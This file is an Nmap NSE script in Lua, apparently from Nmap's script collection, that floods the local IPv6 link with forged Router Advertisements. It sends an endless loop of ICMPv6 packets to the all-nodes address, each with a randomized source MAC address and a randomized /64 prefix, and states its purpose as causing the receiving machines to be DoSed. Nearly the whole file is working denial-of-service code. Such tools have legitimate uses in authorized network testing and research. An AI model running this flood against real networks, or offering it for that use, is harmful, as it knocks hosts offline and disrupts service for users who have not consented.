local nmap = require "nmap"
local packet = require "packet"
local stdnse = require "stdnse"
local math = require "math"
local string = require "string"
local os = require "os"

description = [[ Generates a flood of Router Adverisments (RA) with randomized source MAC address and annouced IPv6 prefixes causing machines to be DoSed.
]]

---
-- @args
-- ipv6-ra-flood.interface defines interface we should broadcast on (default: first interface)
--
-- @usage
-- nmap --script ipv6-ra-flood.nse
-- nmap --script ipv6-ra-fllod.nse --script-args 'interface=<interface>'
--
-- @output
-- n/a

author = "Adam Števko"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"dos", "intrusive"}

try = nmap.new_try()

math.randomseed(os.time())

prerule = function()
	if nmap.address_family() ~= "inet6" then
	 	stdnse.print_debug("%s is IPv6 compatible only.", SCRIPT_NAME)
		return false 
	end
	
	if not nmap.is_privileged() then
		stdnse.print_debug("Running %s needs root privileges.", SCRIPT_NAME)	
		return false 
	end

	return true
end

local function get_interfaces()
	local interface_name = stdnse.get_script_args(SCRIPT_NAME .. ".interface") or nmap.get_interface()

	-- interfaces list (decide which interfaces to broadcast on)
	local interfaces = {}
	if interface_name then
		-- single interface defined
		local if_table = nmap.get_interface_info(interface_name)
		if if_table and packet.ip6tobin(if_table.address) and if_table.link == "ethernet" then
			interfaces[#interfaces + 1] = if_table
		else
			stdnse.print_debug("Interface not supported or not properly configured.")
		end
	else
		for _, if_table in ipairs(nmap.list_interfaces()) do
			if packet.ip6tobin(if_table.address) and if_table.link == "ethernet" then
				table.insert(interfaces, if_table)
			end
		end
	end

	return interfaces
end

--- Generates random MAC address
-- @return mac string containing random MAC address 
local function random_mac()

	local mac = string.format("%02x:%02x:%02x:%02x:%02x:%02x", 00, 180, math.random(256)-1, math.random(256)-1, math.random(256)-1, math.random(256)-1)
	return mac
end

--- Generates random IPv6 prefix
-- @return prefix string containing random IPv6 /64 prefix
local function get_random_prefix()
	local prefix = string.format("2a01:%02x%02x:%02x%02x:%02x%02x::", math.random(256)-1, math.random(256)-1, math.random(256)-1, math.random(256)-1, math.random(256)-1, math.random(256)-1)

	return prefix
end

--- Build an ICMPv6 payload of Router Advertisement.
-- @param mac_src six-byte string of the source MAC address.
-- @param prefix 16-byte string of IPv6 address.
-- @param prefix_len integer that represents the length of the prefix.
-- @param valid_time integer that represents the valid time of the prefix.
-- @param preferred_time integer that represents the preferred time of the prefix.
-- @param mtu integer that represents MTU of the link
-- @return icmpv6_payload string representing ICMPv6 RA payload

local function build_router_advert(mac_src,prefix,prefix_len,valid_time,preferred_time, mtu)
	local ra_msg = string.char(0x0, --cur hop limit
		0x08, --flags
		0x00,0x00, --router lifetime
		0x00,0x00,0x00,0x00, --reachable time
		0x00,0x00,0x00,0x00) --retrans timer

	local mtu_option_msg = string.char(0x00, 0x00) .. -- reserved 
		packet.numtostr32(mtu) -- MTU

	local prefix_option_msg = string.char(prefix_len, 0xc0) .. --flags: Onlink, Auto
		packet.set_u32("....", 0, valid_time) .. -- valid lifetime
		packet.set_u32("....", 0, preferred_time) .. -- preffered lifetime
		string.char(0,0,0,0) .. --unknown
		prefix

	local icmpv6_mtu_option = packet.Packet:set_icmpv6_option(packet.ND_OPT_MTU, mtu_option_msg)
	local icmpv6_prefix_option = packet.Packet:set_icmpv6_option(packet.ND_OPT_PREFIX_INFORMATION, prefix_option_msg)
	local icmpv6_src_link_option = packet.Packet:set_icmpv6_option(packet.ND_OPT_SOURCE_LINKADDR, mac_src)
	
	local icmpv6_payload = ra_msg .. icmpv6_mtu_option .. icmpv6_prefix_option .. icmpv6_src_link_option

	return icmpv6_payload
end

--- Broadcasting on the selected interface
-- @param iface table containing interface information 
local function broadcast_on_interface(iface)
	stdnse.print_debug("Starting " .. SCRIPT_NAME .. " on " .. iface.device)
	
	local dnet = nmap.new_dnet()

	try(dnet:ethernet_open(iface.device))
	
	local dst_mac = packet.mactobin("33:33:00:00:00:01")
	local dst_ip6_addr = packet.ip6tobin("ff02::1")
	
	local prefix_len = 64
	
	--- maximum possible value of 4-byte integer
	local valid_time = tonumber(0xffffffff)
	local preffered_time = tonumber(0xffffffff) 
	
	local mtu = 1500

	while true do

		local src_mac = packet.mactobin(random_mac()) 
		local src_ip6_addr = packet.mac_to_lladdr(src_mac)
		
		local prefix = packet.ip6tobin(get_random_prefix())
		
		local packet = packet.Frame:new()

		packet.mac_src = src_mac
		packet.mac_dst = dst_mac
		packet.ip_bin_src = src_ip6_addr
		packet.ip_bin_dst = dst_ip6_addr
		
		local icmpv6_payload = build_router_advert(src_mac, prefix, prefix_len, valid_time, preffered_time, mtu)
		packet:build_icmpv6_header(134, 0, icmpv6_payload)
		packet:build_ipv6_packet()
		packet:build_ether_frame()

		try(dnet:ethernet_send(packet.frame_buf))
	end
end

function action()
	ifaces = get_interfaces()
	
	broadcast_on_interface(ifaces[1])
end
